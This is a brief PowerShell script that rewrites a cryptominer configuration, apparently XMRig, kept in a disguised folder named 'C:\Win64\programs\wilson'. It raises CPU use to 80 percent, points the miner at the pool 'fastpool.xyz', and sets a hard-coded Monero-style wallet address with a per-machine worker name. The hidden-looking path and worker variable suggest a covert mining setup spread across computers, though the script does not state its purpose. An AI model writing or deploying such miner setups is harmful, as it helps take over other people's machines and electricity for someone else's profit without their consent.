# Load the JSON data from the file
$jsonData = Get-Content -Raw -Path "C:\Win64\programs\wilson\config.json" | ConvertFrom-Json

# Modify the values
$jsonData.cpu.'max-threads-hint' = "80"
$jsonData.pools[0].url = "fastpool.xyz:10055"
$jsonData.pools[0].user = "47B1qAHmTVeN9bb4j13RvJeDeedsVpfqsi8SYGZL5Uzt2rvTTXMU1ddhntLAnNnvWNjUH2zqCjqfGYkUjzBdNe73G6X29nq@%WORKER_NAME%"

# Convert the modified data back to JSON
$modifiedJson = $jsonData | ConvertTo-Json -Depth 10

# Save the modified JSON data back to the file
$modifiedJson | Set-Content -Path "C:\Win64\programs\wilson\config.json"

Write-Host "JSON data modified successfully!"
